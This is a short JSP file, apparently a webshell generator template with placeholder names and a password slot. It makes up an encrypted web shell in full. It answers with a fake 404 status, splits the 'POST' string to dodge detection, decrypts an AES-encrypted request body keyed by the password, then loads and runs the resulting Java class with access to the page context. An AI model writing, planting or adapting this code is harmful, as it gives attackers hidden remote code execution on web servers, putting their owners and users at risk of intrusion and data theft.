<%@ page import="java.util.*,javax.crypto.*" %><%!class {stryi} extends ClassLoader {
public {stryi}(ClassLoader {strshiwu}) {super({strshiwu});}public Class {strer}(byte[]
{strsi}) {return defineClass(null, {strsi}, 0, {strsi}.length);}}%><%response.setStatus(Integer.parseInt("404"));
if (request.getMethod().equals("PO" + "ST")) {String {strsan} = "<<<PASSWORD>>>";session.setAttribute("{strwu}", {strsan});
Cipher {strshier} = Cipher.getInstance("AES");SecretKey {strshisan} = new javax.crypto.SecretKey() {
public String getAlgorithm() {return "AES";}public String getFormat() {return "RAW";}public byte[] getEncoded() {
return {strsan}.getBytes();}};{strshier}.init(2, {strshisan});ClassLoader {strshiyi} = ClassLoader.getSystemClassLoader();
{stryi} {strliu} = new {stryi}({strshiyi});String {strba} = request.getReader().readLine();
byte[] {strjiu} = Base64.getDecoder().decode({strba});byte[] {strshi} = {strshier}.doFinal({strjiu});
Class cls = {strliu}.{strer}({strshi});Object {strqi} = cls.newInstance();{strqi}.equals(pageContext);}%>